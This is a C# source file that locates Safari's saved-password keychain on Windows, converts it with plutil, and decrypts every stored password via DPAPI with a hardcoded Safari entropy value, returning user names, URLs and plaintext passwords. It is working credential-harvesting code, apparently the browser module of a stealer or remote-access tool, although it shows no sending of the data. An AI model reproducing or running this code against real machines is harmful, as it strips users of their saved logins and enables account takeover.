using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

internal sealed class SafariDecryptor
{
    private static byte[] salt = new byte[] { 
        0x1d, 0xac, 0xa8, 0xf8, 0xd3, 0xb8, 0x48, 0x3e, 0x48, 0x7d, 0x3e, 10, 0x62, 7, 0xdd, 0x26,
        230, 0x67, 0x81, 3, 0xe7, 0xb2, 0x13, 0xa5, 0xb0, 0x79, 0xee, 0x4f, 15, 0x41, 0x15, 0xed,
        0x7b, 20, 140, 0xe5, 0x4b, 70, 13, 0xc1, 0x8e, 0xfe, 0xd6, 0xe7, 0x27, 0x75, 6, 0x8b,
        0x49, 0, 220, 15, 0x30, 160, 0x9e, 0xfd, 9, 0x85, 0xf1, 200, 170, 0x75, 0xc1, 8,
        5, 0x79, 1, 0xe2, 0x97, 0xd8, 0xaf, 0x80, 0x38, 0x60, 11, 0x71, 14, 0x68, 0x53, 0x77,
        0x2f, 15, 0x61, 0xf6, 0x1d, 0x8e, 0x8f, 0x5c, 0xb2, 0x3d, 0x21, 0x74, 0x40, 0x4b, 0xb5, 6,
        110, 0xab, 0x7a, 0xbd, 0x8b, 0xa9, 0x7e, 50, 0x8f, 110, 6, 0x24, 0xd9, 0x29, 0xa4, 0xa5,
        190, 0x26, 0x23, 0xfd, 0xee, 0xf1, 0x4c, 15, 0x74, 0x5e, 0x58, 0xfb, 0x91, 0x74, 0xef, 0x91,
        0x63, 0x6f, 0x6d, 0x2e, 0x61, 0x70, 0x70, 0x6c, 0x65, 0x2e, 0x53, 0x61, 0x66, 0x61, 0x72, 0x69
    };

    internal static bool ConvertKeychain(string plutil, string keychain, ref string fixedPath)
    {
        fixedPath = null;
        if (!File.Exists(plutil))
        {
            return false;
        }
        Process process = new Process {
            StartInfo = { 
                FileName = plutil,
                Arguments = Convert.ToString(Convert.ToString(" -convert xml1 -s -o \"") + InlineAssignHelper<string>(ref fixedPath, Path.GetTempPath() + "\\fixed_keychain.xml\" ") + "\"") + keychain + "\"",
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                UseShellExecute = false
            }
        };
        process.Start();
        process.WaitForExit();
        return (process.StandardOutput.ReadToEnd().Length == 0);
    }

    private static string DecryptPassword(byte[] pwBuffer)
    {
        byte[] bytes = ProtectedData.Unprotect(pwBuffer, salt, DataProtectionScope.CurrentUser);
        return Encoding.UTF8.GetString(bytes, 4, bytes.Length - 4);
    }

    private static string GetBetween(string input, string str1, string str2, int index)
    {
        string str3 = Regex.Split(input, str1)[index + 1];
        return Regex.Split(str3, str2)[0];
    }

    private static T InlineAssignHelper<T>(ref T target, T value)
    {
        target = value;
        return value;
    }

    internal static List<RecoveredBrowserAccount> ParseEntries(string keychain)
    {
        string[] strArray;
        string input = File.ReadAllText(keychain);
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        int num2 = InlineAssignHelper<string[]>(ref strArray, Regex.Split(Regex.Split(input, "<array>")[1], "<dict>")).Length - 1;
        for (int i = 1; i <= num2; i++)
        {
            RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                UserName = GetBetween(strArray[i], "<string>", "</string>", 0),
                URL = GetBetween(strArray[i], "<string>", "</string>", 5),
                Password = DecryptPassword(Convert.FromBase64String(GetBetween(strArray[i], "<data>", "</data>", 0))),
                Browser = "Safari Browser"
            };
            list.Add(item);
        }
        return list;
    }
}

